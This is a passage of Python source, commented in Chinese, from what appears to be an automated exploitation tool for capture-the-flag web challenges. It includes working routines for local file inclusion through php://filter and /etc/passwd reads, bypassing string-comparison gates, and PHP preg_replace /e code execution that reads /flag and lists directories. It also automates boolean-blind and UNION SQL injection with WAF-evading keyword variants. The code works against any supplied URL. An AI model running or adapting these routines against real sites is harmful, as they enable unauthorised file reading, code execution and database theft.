    变量名不等于参数名：`$text = $_GET["text"]` 得先建映射，才能把闸门挂回 URL 参数上。
    """
    out, seen = [], set()
    for blob in _src_blobs(text or ""):
        varmap = {}
        for mo in SRC_ASSIGN_RE.finditer(blob):
            varmap.setdefault(mo.group(1).lower(), mo.group(2))
        for mo in SRC_GATE_RE.finditer(blob):
            if mo.group(1):
                var, lit, mode = mo.group(1), mo.group(2), "wrapper"
            else:
                var, lit, mode = mo.group(3), mo.group(4), "direct"
            if not var or not lit:
                continue
            name = varmap.get(var.lower(), var)
            key = (name.lower(), lit)
            if key in seen or len(out) >= 4:
                continue
            seen.add(key)
            out.append((name, lit, mode))
    return out


def _b64_php(text):
    """响应里那段 base64 若能解出 PHP 源码就返回解码文本，否则空串。"""
    for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text or ""):
        try:
            dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
        except Exception:
            continue
        if b"<?php" in dec or b"<?=" in dec:
            return dec.decode("utf-8", "replace")
    return ""


def php_gate_chain(ctx, fp):
    """把闸门参数和读文件参数拼在同一发请求里，专打「先比字符串再 include」的题。"""
    gates = fp.get("src_gates") or []
    if not gates:
        return []
    entry = fp.get("final_url") or ctx.url
    names = list(fp.get("src_get") or [])
    hits = []
    for gate_name, lit, mode in gates[:2]:
        # 不要再 quote()：_set_param 里的 urlencode 才是唯一一次编码，
        # 自己先转义一遍会变成 I%2520have…，服务端拿到的字面量就对不上了。
        gate = "data://text/plain," + lit if mode == "wrapper" else lit
        others = [n for n in names if n.lower() != gate_name.lower()] or ["file", "page", "p"]
        for other in others[:2]:
            # 队列会边跑边长：读到 index.php 之后，下一个要读的文件名就从那份源码里挑，
            # 这是 LFI 题通用的「读源码→找下一个文件」推进方式，不是给某一题写死的答案。
            queue = list(GATE_LFI_PAYLOADS)
            tried = set()
            while queue and not hits:
                payload = queue.pop(0)
                if payload in tried:
                    continue
                tried.add(payload)
                if ctx.budget.used + 2 >= ctx.budget.max_requests:
                    return hits
                item = ctx.get(_set_param(_set_param(entry, gate_name, gate), other, payload))
                body = text_of(item)
                src = _b64_php(body)
                flags = collect_flags(body) or collect_flags(src)
                if flags:
                    for f in flags:
                        ctx._add_flag(f, item["url"] + "（闸门链读取）")
                    ctx.add("flag-read", item["url"], payload=payload,
                            evidence="%s=%s 顶开闸门后，%s 直接取出 flag" % (gate_name, lit, other))
                    hits.extend(flags)
                    break
                if "root:" in body and "bin/sh" in body:
                    ctx.add("lfi", item["url"], payload=payload,
                            evidence="%s 过闸后 %s 读到 /etc/passwd" % (gate_name, other))
                elif src:
                    ctx.add("lfi-source", item["url"], payload=payload,
                            evidence="%s 过闸后 %s 读出源码 %d 字节" % (gate_name, other, len(src)))
                    for f in collect_flags(src):
                        ctx._add_flag(f, item["url"] + "（%s 源码）" % other)
                    for name in src_followups(src, tried):
                        queue.append("php://filter/convert.base64-encode/resource=" + name)
                    # 源码里写着 preg_replace /e：这份文件被"执行"而不是"读出来"的时候，
                    # 参数名+参数值这对组合就是执行点。这里得用裸文件名让 include 真的跑它。
                    plain = payload.split("resource=")[-1] if "resource=" in payload else payload
                    if src_pcre_e_hint(src) and not hits:
                        def fire(extra, entry=entry, gname=gate_name, gate=gate,
                                 other=other, plain=plain):
                            return ctx.get(_set_params(entry, [(gname, gate), (other, plain)]
                                                       + list(extra.items())))

                        if php_pcre_e_exec(ctx, fire, src,
                                           note="（%s 过闸后 include %s）" % (gate_name, plain)):
                            hits.append("pcre-e")
            if hits:
                return hits
            # 读得到源码却拿不到 flag：这类题的 flag 在只有代码执行才够得着的地方
            # （随机名文件、环境变量），闸门已经顶开，直接把包含点升级成执行点。
            before = len(ctx.flags)

            def fire(payload, body=None, entry=entry, gname=gate_name, gate=gate, other=other):
                url = _set_param(_set_param(entry, gname, gate), other,
                                 "php://input" if body is not None else payload)
                return ctx.post_raw(url, body) if body is not None else ctx.get(url)

            if lfi_code_exec(ctx, fire, note="（%s 已过闸）" % gate_name):
                hits = [f["value"] for f in ctx.flags[before:]] or ["exec"]
                return hits
    return hits


def _set_params(base, pairs):
    """按顺序在 URL 上设置多个参数。"""
    for k, v in pairs:
        base = _set_param(base, k, v)
    return base


# ---- PHP5 preg_replace /e：参数名当模式，参数值放 ${…} -----------------
# 现场形状（ZJCTF 的 next.php）：
#   preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str)
#   foreach($_GET as $re => $str) { echo complex($re, $str); }
# /e 会把替换串当 PHP 代码求值，${…} 在双引号里插值时就把函数跑了。
# 参数名里不能有点：PHP 会把参数名中的 . 和空格换成 _，带点的模式（.+/.*）实测全部匹配不上。
PCRE_E_KEYS = (r"\S+", r"[^,]*", r"[^\s,]*")
PCRE_E_PROBE = "${phpinfo()}"
PCRE_E_SIGS = ("PHP Version", "uid=", "www-data", "memory usage")
PCRE_E_READ_CMDS = ("echo @file_get_contents('/flag');",
                    "echo @file_get_contents('/flag.txt');",
                    "print_r(scandir('/'));",
                    "var_dump(glob('/flag*'));",
                    "var_dump(glob('/var/www/html/*flag*'));")
SRC_FUNC0_RE = re.compile(r"function\s+(\w+)\s*\(\s*\s*\)", re.I)
SRC_CODE_PARAM_RE = re.compile(r"(?:eval|assert|system|passthru|popen|include|require)"
                               r"\s*\(\s*\$_(?:GET|POST|REQUEST)\s*\[\s*['\"](\w+)['\"]", re.I)


def src_pcre_e_hint(src):
    """源码里 preg_replace 带 e 修饰符＝PHP5 的 /e 代码执行面；不是就返回空串。"""
    s = src or ""
    if not re.search(r"preg_replace|create_function", s, re.I):
        return ""
    return "/e" if re.search(r"/e[a-z]{0,3}['\"]", s) else ""


def php_pcre_e_exec(ctx, fire, src, note=""):
    """在 /e 面上执行代码并顺着读 flag；fire(extra) 由调用方负责带上闸门和包含参数。

    判定不能只看「探针没被回显」。现场踩过反面：phpinfo 的页面里就带着
    `_REQUEST["\\S+"] ${phpinfo()}` 这一段——执行成功的响应里天然有探针原文，
    按回显排除会把真执行判成假阴性。改成与基线响应比较：
    同一发请求不带 payload 参数时出现的特征，不能算执行证据。
    """
    base_item = fire({})
    base_text = _strip(text_of(base_item)) if base_item else ""
    good_key = ""
    for key in PCRE_E_KEYS:
        item = fire({key: PCRE_E_PROBE})
        flat = _strip(text_of(item)) if item else ""
        sigs = [s for s in PCRE_E_SIGS if s in flat and s not in base_text]
        if item and sigs:
            good_key = key
            ctx.add("php-pcre-e", item["url"], payload="%s=%s" % (key, PCRE_E_PROBE),
                    evidence="preg_replace 的 /e 修饰符被执行（基线里没有的特征 %s）%s"
                             % ("/".join(sigs[:2]), note))
            break
    if not good_key:
        return False
    funcs = list(dict.fromkeys(SRC_FUNC0_RE.findall(src or "")))[:3]
    mo = SRC_CODE_PARAM_RE.search(src or "")
    code_param = mo.group(1) if mo else ""
    jobs = [(PCRE_E_PROBE, None)]
    for fn in funcs:
        expr = "${%s()}" % fn
        if code_param:
            jobs += [(expr, cmd) for cmd in PCRE_E_READ_CMDS]
        else:
            jobs.append((expr, None))
    for expr, cmd in jobs:
        if ctx.budget.used + 2 >= ctx.budget.max_requests:
            return True
        extra = {good_key: expr}
        if cmd:
            extra[code_param or "cmd"] = cmd
        item = fire(extra)
        if not item:
            continue
        text = text_of(item)
        flags = collect_flags(text) + _b64_flags(text)
        if flags:
            for f in flags:
                ctx._add_flag(f, item["url"] + "（/e 执行）")
            ctx.log("[deep] /e 执行读出 flag：%s" % (cmd or expr))
            return True
        if cmd and cmd.startswith("print_r"):
            # 目录里没有已知 flag 名：把带 flag 的条目挑出来逐个 cat
            for name in list(dict.fromkeys(
                    re.findall(r"\]\s*=>\s*['\"]?([A-Za-z0-9_.\-]*flag[A-Za-z0-9_.\-]*)",
                               _strip(text))))[:3]:
                it2 = fire({good_key: expr, code_param or "cmd":
                            "echo @file_get_contents('/%s');" % name.lstrip("/")})
                got = collect_flags(text_of(it2)) if it2 else []
                for f in got:
                    ctx._add_flag(f, it2["url"] + "（/e 列目录定位）")
                if got:
                    ctx.log("[deep] /e 按目录列表读到 /%s" % name)
                    return True
    return True


def _src_stage_exec(ctx, target, src, payload):
    """读到源码后顺着源码推进：目前这一层认 preg_replace /e。

    包含点的参数要换成裸文件名——/e 的代码在被 include 的那份文件里跑，
    用 php://filter 只是把源码读出来，跑不起来。
    """
    if not src_pcre_e_hint(src):
        return False
    plain = payload.split("resource=")[-1] if "resource=" in payload else payload

    def fire(extra):
        return send_value(ctx, target, plain, extra=extra)

    return php_pcre_e_exec(ctx, fire, src, note="（include %s）" % plain)


def harvest_src_params(text):
    """从页面里可见的源码抽入口参数名，返回 (GET 名, POST 名)，保持出现顺序。

    只认语言里「读请求参数」的固定写法，不猜变量名；同名只留一次。
    """
    gets, posts, seen = [], [], set()
    for blob in _src_blobs(text or ""):
        for mo in SRC_PARAM_RE.finditer(blob):
            gs = mo.groups()
            for i in range(0, len(gs) - 1, 2):
                kind, name = (gs[i] or "").upper(), gs[i + 1]
                if not name or name.lower() in seen or name.lower() in SRC_PARAM_STOP:
                    continue
                seen.add(name.lower())
                (posts if any(k in kind for k in SRC_POST_KINDS) else gets).append(name)
                break
    return gets[:8], posts[:8]


def analyze(ctx):
    """第一阶段：读首页，抽标题/服务端/表单/带参链接/技术线索。"""
    home = ctx.get(ctx.url)
    text = text_of(home)
    final_url = home.get("final_url") or ctx.url
    mo = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
    title = re.sub(r"\s+", " ", mo.group(1)).strip()[:120] if mo else ""
    headers = {k.lower(): v for k, v in (home.get("headers") or {}).items()}
    forms = parse_forms(text, final_url)
    links = parse_links(text, final_url)
    cookies = [c.name for c in ctx.jar]
    tech = []
    low = text.lower()
    for key, label in ((".php", "PHP"), (".jsp", "JSP"), ("wp-content", "WordPress"),
                       ("__viewstate", "ASP.NET"), ("thymeleaf", "Thymeleaf"),
                       ("jinja", "Jinja2"), ("/static/js/", "前端框架")):
        if key in low:
            tech.append(label)
    fp = {"status": home.get("status"), "title": title, "tech": tech, "cookies": cookies,
          "server": headers.get("server", ""), "powered_by": headers.get("x-powered-by", ""),
          "content_type": headers.get("content-type", ""), "bytes": len(text),
          "forms": forms, "links": links, "small": _snippet(text, 200),
          "final_url": final_url,
          "dead": bool(re.search("环境已到期|环境已销毁|环境将在", text))}
    # HTML 上没有入口时，入口一定写在 JS 里（SPA 题）：连外链 JS 一起抽一遍。
    # HTML 已有入口时只读内联脚本，不额外花请求。
    jends, jlinks, jforms, jparams = harvest_js(
        ctx, text, final_url, fetch_assets=not (forms or links))
    fp["js_endpoints"], fp["js_links"], fp["js_forms"], fp["js_params"] = jends, jlinks, jforms, jparams
    src_get, src_post = harvest_src_params(text)
    fp["src_get"], fp["src_post"] = src_get, src_post
    fp["src_gates"] = harvest_src_gates(text)
    ctx.log("[deep] 页面分析：%s | 技术线索 %s | 表单 %d 个 | 带参链接 %d 条"
            % (title or "(无标题)", ",".join(tech) or "未识别", len(forms), len(links)))
    if src_get or src_post:
        ctx.log("[deep] 页面源码里的入口参数：GET %s | POST %s%s"
                % (",".join(src_get) or "无", ",".join(src_post) or "无",
                   "｜闸门 " + "; ".join("%s==%s(%s)" % (g[0], g[1], g[2]) for g in fp["src_gates"])
                   if fp["src_gates"] else ""))
    if jends or jlinks or jforms or jparams:
        ctx.log("[deep] JS 抽取：接口 %d 个 | ajax 表单 %d 个 | 参数名 %s"
                % (len(jends), len(jforms), ",".join(jparams[:8]) or "无"))
    return fp


def build_targets(ctx, fp):
    """把 URL 参数、带参链接参数、表单字段统一成可测目标。"""
    targets = []
    entry = fp.get("final_url") or ctx.url
    for name, value in parse_qsl(urlsplit(entry).query, keep_blank_values=True)[:6]:
        targets.append({"kind": "get", "url": entry, "param": name, "value": value or "1"})
    if entry != ctx.url:
        for name, value in parse_qsl(urlsplit(ctx.url).query, keep_blank_values=True)[:6]:
            if not any(t["param"] == name for t in targets):
                targets.append({"kind": "get", "url": ctx.url, "param": name, "value": value or "1"})
    for link in (fp.get("links") or []) + (fp.get("js_links") or []):
        for name, value in parse_qsl(urlsplit(link).query, keep_blank_values=True)[:4]:
            if len(targets) >= MAX_TARGETS:
                break
            if any(t["url"] == link and t["param"] == name for t in targets):
                continue
            targets.append({"kind": "get", "url": link, "param": name, "value": value or "1"})
    for form in (fp.get("forms") or []) + (fp.get("js_forms") or []):
        if form["files"]:
            # 上传表单的文本框只是随文件一起提交的附属字段，单独拿来做注入矩阵会反复打同一个
            # 上传接口，既浪费预算又可能留下大量空文件，交给上传测试单独处理。
            continue
        for name, value in list(form["fields"].items())[:4]:
            if len(targets) >= MAX_TARGETS:
                break
            if any(t["url"] == form["action"] and t["param"] == name for t in targets):
                continue
            targets.append({"kind": "post" if form["method"] == "POST" else "get",
                            "url": form["action"], "param": name,
                            "value": value or "1", "form": form})
    # 源码写在页面上时，这些参数名的可信度远高于字典盲探（字典 48 个要 96 发，源码名 2 发就够），
    # 所以先按名字逐个探一次，命中即成目标；探不动再退回字典。
    known = set(t["param"] for t in targets)
    src_get = [n for n in (fp.get("src_get") or []) if n not in known]
    if src_get and len(targets) < MAX_TARGETS:
        targets.extend(guess_targets(ctx, names=src_get, probe_value=_lfi_probe_for(fp)))
    known = set(t["param"] for t in targets)
    src_post = [n for n in (fp.get("src_post") or []) if n not in known]
    if src_post and len(targets) < MAX_TARGETS:
        targets.extend(guess_post_targets(ctx, names=src_post))
    if not targets:
        # 没有任何可见入口（参数/链接/表单）时，隐藏入口参数只能靠盲探；
        # 页面长短不作为门槛——路由器类题目首页正文长但入口藏在 ?ip= 这类参数里。
        # JS 里抽到的参数名优先试（SPA 题的入口名只有 JS 知道）。
        names = list(dict.fromkeys((fp.get("js_params") or []) + GUESS_PARAMS))
        targets.extend(guess_targets(ctx, names=names, probe_value=_lfi_probe_for(fp)))
    if not targets:
        # GET 怎么探都是同一张页 → 入口多半只吃 POST（SSTI、反序列化、逻辑题）
        post_names = list(dict.fromkeys((fp.get("js_params") or []) + POST_GUESS_PARAMS))
        targets.extend(guess_post_targets(ctx, names=post_names))
    # JS 里的业务接口独立探一轮：SPA 的真实入口常和首页不在同一路径上，
    # 首页抽到 ajax 表单也不能代表接口参数已经测到。
    covered = set(t["url"].split("?")[0] for t in targets)
    for ep in (fp.get("js_endpoints") or [])[:3]:
        if ep.split("?")[0] in covered or len(targets) >= MAX_TARGETS:
            continue
        if ctx.budget.used + 16 >= ctx.budget.max_requests:
            break
        pool = (fp.get("js_params") or [])[:6] or SHORT_GUESS_PARAMS
        got = guess_targets(ctx, base_url=ep, names=pool, probe_value=_lfi_probe_for(fp))
        if not got:
            got = guess_post_targets(ctx, base_url=ep,
                                     names=(fp.get("js_params") or [])[:8] or POST_GUESS_PARAMS)
        for t in got:
            if len(targets) < MAX_TARGETS:
                targets.append(t)
    # 同一 (方法, 路径, 参数名) 只留一个：两个表单指向同一登录口、或 HTML 与 JS
    # 各抽到一份时，重复目标会把整轮预算耗在同一个接口上（现场 500 次请求用尽即此）。
    uniq = []
    seen_keys = set()
    for t in targets:
        key = (t.get("kind"), urlsplit(t["url"]).path or "/", t.get("param"))
        if key in seen_keys:
            continue
        seen_keys.add(key)
        uniq.append(t)
    return uniq[:MAX_TARGETS]


GUESS_PARAMS = ["p", "file", "filename", "page", "path", "url", "u", "uri", "link",
                "src", "target", "redirect", "next", "image", "img", "load", "host",
                "ip", "domain", "site", "to", "out", "f", "doc", "name", "cmd",
                "exec", "include", "action", "do", "view", "read", "content", "lang",
                # 模板/渲染类题目的入口名常常不在老字典里（现场 SSTI 题就是这么漏的）
                "tpl", "template", "render", "code", "text", "msg", "message",
                "input", "value", "data", "query", "q", "s", "id"]

# 已知脚本名时的短字典：命令注入/文件读取类入口最常用的几个参数名
SHORT_GUESS_PARAMS = ["ip", "host", "cmd", "command", "p", "file", "page", "url",
                      "path", "target", "name", "text", "query", "q"]

# GET 盲探的第二探针：唯一长标记串。被回显 = 参数确实被读取；没变化 = 参数不存在
GET_ECHO_MARK = "CTFBOX9137ECHO"


def _lfi_probe_for(fp, script=""):
    """按指纹挑「一定会改变响应」的首探针。

    /etc/passwd 在 Windows 靶机（phpstudy、路由器固件）上毫无反应，于是 PHP 的
    LFI 参数会被误判成「参数不存在」；php://filter 包装器在任意系统都能把
    index.php 变成一串 base64，响应差异足够大。
    """
    tech = " ".join(fp.get("tech") or []) if isinstance(fp, dict) else ""
    if "PHP" in tech.upper() or script.lower().endswith(".php"):
        return "php://filter/convert.base64-encode/resource=index.php"
    return "file:///etc/passwd"


def guess_targets(ctx, base_url=None, names=None, probe_value="file:///etc/passwd"):
    """首页无表单无参数时，按常见参数名试探：响应变化、或把唯一标记原样回显，就算有效参数。

    只比"响应变化"会漏掉 echo 型入口：SSTI/模板类题目拿 ?name=1 时页面长度几乎不动，
    但参数其实已经被读取，换一个足够长的唯一标记串才能看出来。
    """
    out = []
    url = base_url or ctx.url
    pool = names if names is not None else GUESS_PARAMS
    base = ctx.get(url)
    base_text = _strip(text_of(base))
    base_status = base.get("status")
    for name in pool:
        # 先用「会明显改变响应的值」探：静态占位值 1 在空白首页上往往看不出差异
        hit = False
        for probe in (probe_value, GET_ECHO_MARK):
            item = ctx.get(_set_param(url, name, probe))
            body = _strip(text_of(item))
            if ("root:" in body and "bin:" in body) or collect_flags(body) \
                    or GET_ECHO_MARK in body \
                    or item.get("status") != base_status \
                    or abs(len(body) - len(base_text)) >= 8:
                hit = True
                break
        if hit:
            out.append({"kind": "get", "url": url, "param": name, "value": "1"})
            ctx.log("[deep] 盲探到参数 %s（%s，探针 %s，响应长度 %d）"
                    % (name, url.rsplit("/", 1)[-1] or "/", probe, len(body)))
            if len(out) >= 6:
                break
    return out


# 只做 POST 的入口（SSTI/反序列化/逻辑题常见）：HTML 上没有表单，GET 探什么都是同一张页
POST_GUESS_PARAMS = ["name", "text", "content", "msg", "message", "data", "input", "value",
                     "cmd", "command", "code", "tpl", "template", "query", "q", "search",
                     "username", "user", "password", "pass", "id", "uid", "url", "file",
                     "page", "num", "number", "score", "level", "email", "phone"]


def guess_post_targets(ctx, base_url=None, names=None):
    """盲探 POST 入口：只发普通表单字段，不碰文件上传，也不写任何东西。

    判定要跟「一个肯定不存在的参数名」比，而不是跟 GET 首页比：很多站点根本
    不接受 POST，对任何 POST 都回同一个 405/501 页面——跟 GET 一比就"变化"了，
    于是凭空造出四个假入口，把整个请求预算耗在无效模块上。
    """
    out = []
    url = base_url or ctx.url
    pool = names if names is not None else POST_GUESS_PARAMS
    null = ctx.post_form(url, {"ctfboxnosuchparam": "1"})
    if null.get("error") or null.get("status") in (405, 501):
        return out
    null_text = _strip(text_of(null))
    null_status = null.get("status")
    for name in pool:
        if ctx.budget.used + 2 >= ctx.budget.max_requests:
            break
        item = ctx.post_form(url, {name: "CTFBOXGUESS"})
        if item.get("error") or not item.get("status"):
            continue
        body = _strip(text_of(item))
        if ("root:" in body and "bin:" in body) or collect_flags(body) \
                or "CTFBOXGUESS" in body:
            pass
        elif item.get("status") == null_status and abs(len(body) - len(null_text)) < 8:
            continue
        form = {"action": url, "method": "POST", "enctype": "", "fields": {name: "1"}, "files": []}
        out.append({"kind": "post", "url": url, "param": name, "value": "1", "form": form})
        ctx.log("[deep] 盲探到 POST 参数 %s（%s，响应长度 %d→%d，状态 %s）"
                % (name, url.rsplit("/", 1)[-1] or "/", len(null_text), len(body),
                   item.get("status")))
        if len(out) >= 4:
            break
    return out


def _set_param(base, name, value):
    """在 URL 上设置参数：已有同名就替换，没有就追加（首页常常完全不带查询串）。"""
    parts = urlsplit(base)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    found = False
    new = []
    for k, v in pairs:
        if k == name:
            new.append((k, value))
            found = True
        else:
            new.append((k, v))
    if not found:
        new.append((name, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(new), ""))


def send_value(ctx, target, value, url_override=None, extra=None):
    """往目标参数填值。extra 在同一发请求上追加/覆盖其它参数
    ——/e 这类题的执行点正好落在「另一个参数的名字」上，必须同请求带过去。"""
    if target["kind"] == "post":
        fields = dict(target["form"]["fields"])
        fields[target["param"]] = value
        fields.update(extra or {})
        return ctx.post_form(url_override or target["url"], fields)
    if target["kind"] == "get" and target.get("form"):
        # GET 表单：其余字段按默认值一起带上，只替换被测参数。
        fields = dict(target["form"]["fields"])
        fields[target["param"]] = value
        fields.update(extra or {})
        base = url_override or target["url"]
        sep = "&" if "?" in base else "?"
        return ctx.get(base + sep + urlencode(fields))
    base = url_override or target["url"]
    return ctx.get(_set_params(_set_param(base, target["param"], value),
                               list((extra or {}).items())))


def _differs(a, b):
    """两个响应的实质差异：状态码不同，或去标签正文差异 ≥15 字节且 ≥1.5%。

    阈值不能只看 40 字节：像"新闻查询"这类页面，真假条件只差一行
    `ID: 1 / Data: ctfhub`（约 20 字节），按 40 字节会把布尔注入判成无差异。
    """
    ta, tb = _strip(text_of(a)), _strip(text_of(b))
    if a.get("status") != b.get("status") and (len(ta) < 40 or len(tb) < 40):
        return True
    if max(len(ta), len(tb)) == 0:
        return False
    diff = abs(len(ta) - len(tb))
    if diff < 15:
        return False
    return diff >= int(max(len(ta), len(tb)) * 0.015)


# ---------------------------------------------------------------------------
# 各类 payload 矩阵
# ---------------------------------------------------------------------------
BLIND_FLAG_EXPRS = ("select flag from flag", "select group_concat(flag) from flag",
                     "select flag from flag_table", "select group_concat(flag) from flag_table")


def _blind_payload(expr, quote):
    return ("1' AND (%s)-- -" % expr) if quote else ("1 AND (%s)" % expr)


SQL_ERR_WORDS = ("query_error", "error", "失败", "错误", "不存在", "invalid", "no result")


def _sql_bool_true(item, false_item):
    """布尔注入判真：先看语义标记，再看响应差异。

    靶场会把整条 SQL 原样回显，payload 越长时间越长——直接比长度会把
    每一发都判成“有差异”，二分永远停在 127。所以 query_error 一律判假。
    """
    a = text_of(item).lower()
    if any(w in a for w in SQL_ERR_WORDS):
        return False
    if any(w in a for w in ("query_success", "success", "成功")):
        return True
    return _differs(item, false_item)


def sqli_blind_dump(ctx, target, quote):
    """布尔盲注取数：用 ascii(substr(...)) 二分，逐字符恢复 flag。

    只发 SELECT 条件，不写库；预算不足时直接放弃，不拖垮整轮。
    先用 1 次请求判断表达式是否真的取到数据，避免在无效表达式上跑满二分。
    """
    remaining = ctx.budget.max_requests - ctx.budget.used
    max_chars = min(46, (remaining - 30) // 7)
    if max_chars < 12:
        return []
    false_item = send_value(ctx, target, ("1' AND 1=2-- -" if quote else "1 AND 1=2"))
    for expr in BLIND_FLAG_EXPRS:
        probe = send_value(ctx, target, _blind_payload("ascii(substr((%s),1,1))>0" % expr, quote))
        if not _sql_bool_true(probe, false_item):
            ctx.log("[deep] 盲注表达式无数据，跳过：%s" % expr)
            continue
        got = ""
        for pos in range(1, max_chars + 1):
            if ctx.budget.used + 8 >= ctx.budget.max_requests:
                return []
            lo, hi = 31, 127
            while lo < hi:
                mid = (lo + hi) // 2
                cond = "ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)
                item = send_value(ctx, target, _blind_payload(cond, quote))
                if _sql_bool_true(item, false_item):
                    lo = mid + 1
                else:
                    hi = mid
            ch = chr(lo)
            if ch == "}" and "{" in got:
                got += ch
                break
            if ch in "{}" or (ch.isprintable() and ch not in " "):
                got += ch
            else:
                break
            if not got[:1].isalnum() and got[:1] != "{":
                break
        if re.search(r"(?:ctfhub|flag)\{[^}]+\}", got):
            ctx.log("[deep] 布尔盲注恢复：%s" % got)
            return [got]
    return []


def test_sqli(ctx, target):
    base_item = send_value(ctx, target, target["value"])
    base_text = text_of(base_item).lower()
    # 1) 报错型
    for payload in SQLI_ERROR_PAYLOADS:
        item = send_value(ctx, target, (target["value"] or "1") + payload)
        text = text_of(item).lower()
        mark = next((m for m in SQLI_ERROR_MARKS if m in text and m not in base_text), None)
        if mark:
            ctx.add("sqli-error", item["url"], payload=payload, evidence=mark)
            sqli_error_dump(ctx, target)
            break
    # 2) 布尔型：1=1 与 1=2 响应必须有实质差异。
    #    字符串型用 `1' AND ...`，数字型用 `1 AND ...`；两种都测，否则数字型参数永远测不出来。
    quote = False
    boolean_hit = False
    for pair in (SQLI_BOOL_PAIR, SQLI_BOOL_PAIR_NUM, SQLI_BOOL_PAIR_XOR):
        truthy = send_value(ctx, target, pair[0])
        falsy = send_value(ctx, target, pair[1])
        if _sql_bool_true(truthy, falsy):
            quote = pair is SQLI_BOOL_PAIR
            boolean_hit = True
            ctx.add("sqli-boolean", truthy["url"],
                    payload="%s / %s" % pair,
                    evidence="真/假条件响应不同（%d vs %d 字节）"
                             % (len(truthy.get("body") or b""), len(falsy.get("body") or b"")),
                    confidence="medium")
            break
    # 2.5) 布尔盲注取数：确认布尔成立后立刻二分跑字符，避免 UNION 先吃掉预算
    if boolean_hit:
        for flag in sqli_blind_dump(ctx, target, quote):
            ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
    # 3) 时间型（默认开启，两次 SLEEP(3) 最多花 6 秒）；布尔已成立时不必再等 SLEEP
    if ctx.allow_time and not boolean_hit:
        for payload, secs in SQLI_TIME_PAYLOADS:
            item = send_value(ctx, target, payload)
            if item.get("elapsed", 0) >= secs - 0.8 and not item.get("error"):
                ctx.add("sqli-time", item["url"], payload=payload,
                        evidence="响应耗时 %.1fs（基线 %.1fs）"
                                 % (item["elapsed"], base_item.get("elapsed", 0)),
                        confidence="medium")
                break
    # 4) UNION 只读取数（默认开启）：只发 SELECT，不写不改，命中 flag 即停
    if ctx.allow_union:
        union_extract(ctx, target, quote=quote)


UNION_COLS_MAX = 8
UNION_TABLES_MAX = 4
UNION_ROWS_MAX = 6
# 有的靶场 WAF 见到字面量 "union select" 直接断连，用注释切开关键字即可通过；
# 下面按优先级依次尝试，能出结果就用第一个成功的写法。
UNION_KW = ("union/**/select", "union\nselect", "union select")


def _union_send(ctx, target, tail, quote=False):
    """按 UNION_KW 的优先级拼 payload 发送，返回第一个没被断连、且带标记的响应。

    字符串上下文必须先用原值加单引号闭合引号（`1' union select ...-- -`），
    数字上下文直接写 `0 union select ...`。
    """
    for kw in UNION_KW:
        if quote:
            # 用不存在的 id（0）打头：页面只 fetch 第一行，带 1 会先显示真实记录，
            # 我们注入的那行永远看不见。
            payload = "0' %s %s-- -" % (kw, tail)
        else:
            payload = "0 " + kw + " " + tail
        item = send_value(ctx, target, payload)
        if item.get("status") and not item.get("error"):
            return payload, item
    return "", None


def _union_rendered(text):
    """页面会把整条 SQL 原样回显出来，回显里当然也有我们的标记；
    只看最后一个 `</code>` 之后的"渲染结果"区域，才不会把回显当成执行结果。"""
    if "</code>" in text:
        return text.rsplit("</code>", 1)[1]
    return text


def _hex_lit(s):
    """把标记写成 MySQL 十六进制字面量（'CBX' → 0x434258）。

    只回显 payload 的页面里出现的永远是 0x… 这串十六进制，而十六进制只含 0-9A-F，
    绝不可能拼出大写字母标记本身；于是「看到标记」只能来自真正执行过的 SQL。
    """
    return "0x" + s.encode("utf-8").hex().upper()


def _union_columns(ctx, target, quote=False):
    """确定 UNION 列数，返回 (列数, 依据)。

    先用十六进制标记探（payload 里看不到 9137，只有真正执行过才会出现）；
    个别方言/WAF 不吃 0x 写法，再用裸数字兜底，但裸数字可能被纯回显页原样打印，
    所以调用方必须再用取数结果确认（见 union_extract）。
    """
    for probe, mode in ((_hex_lit("9137"), "hex"), ("9137", "num")):
        for n in (2, 3, 4, 1, 5, 6, 7, 8)[:UNION_COLS_MAX]:
            payload, item = _union_send(ctx, target, ",".join([probe] * n), quote)
            if not item:
                return 0, ""
            if "9137" in _union_rendered(text_of(item)):
                return n, mode
    return 0, ""


def _union_run(ctx, target, cols, expr, tag="CBX", quote=False):
    """把 expr 塞进每一列试，返回被回显的取值（用十六进制标记包住便于定位）。"""
    inner = "CONCAT(%s,(%s),%s)" % (_hex_lit(tag), expr, _hex_lit("XBC"))
    for idx in range(cols):
        vals = ["NULL"] * cols
        vals[idx] = inner
        payload, item = _union_send(ctx, target, ",".join(vals), quote)
        if not item:
            continue
        text = _union_rendered(text_of(item))
        if tag in text and "XBC" in text[text.find(tag):]:
            part = text[text.find(tag) + len(tag):text.find("XBC", text.find(tag))]
            return part
    return ""


def _union_flag_guess(ctx, target, cols, quote=False):
    """information_schema 被过滤（如下划线 WAF）时的兜底：直接猜常见 flag 表/列。
    全部 payload 不含下划线，兼容剥 _ 的过滤器。"""
    combos = [("flag", "flag"), ("flag", "value"), ("flags", "flag"),
              ("secret", "flag"), ("secret", "value"), ("flag", "content"),
              ("key", "value"), ("admin", "password"), ("user", "password"),
              ("users", "password"), ("flag", "flagg"), ("f1ag", "f1ag")]
    for table, col in combos:
        expr = "SELECT %s FROM %s LIMIT 1" % (col, table)
        data = _union_run(ctx, target, cols, expr, tag="CBG", quote=quote)
        if not data or "SELECT" in data:
            continue
        flags = collect_flags(data)
        if flags:
            for flag in flags:
                ctx._add_flag(flag, target["url"])
            ctx.add("flag-read", target["url"], payload=expr,
                    evidence="UNION 猜表 %s.%s 读到 %s" % (table, col, flags[0][:40]))
            ctx.log("[deep] UNION 猜表命中 flag：%s（%s.%s）" % (flags[0], table, col))
            return True
    return False


def union_extract(ctx, target, quote=False):
    """UNION 只读取数：库名 → 表 → 字段 → 行，遇到 flag 就收工。

    约束：只发 SELECT / UNION SELECT，不写库、不改表、不读系统文件。
    """
    cols, mode = _union_columns(ctx, target, quote)
    if not cols:
        return
    db = _union_run(ctx, target, cols, "SELECT database()", quote=quote)
    if mode == "num" and not db:
        # 裸数字只是被页面原样回显（payload 回显型站点常见），取不到任何值就不算注入
        ctx.log("[deep] UNION 数字标记无取数结果，判为 payload 回显而非注入，放弃")
        return
    ctx.log("[deep] UNION 可用（%d 列），开始只读取数" % cols)
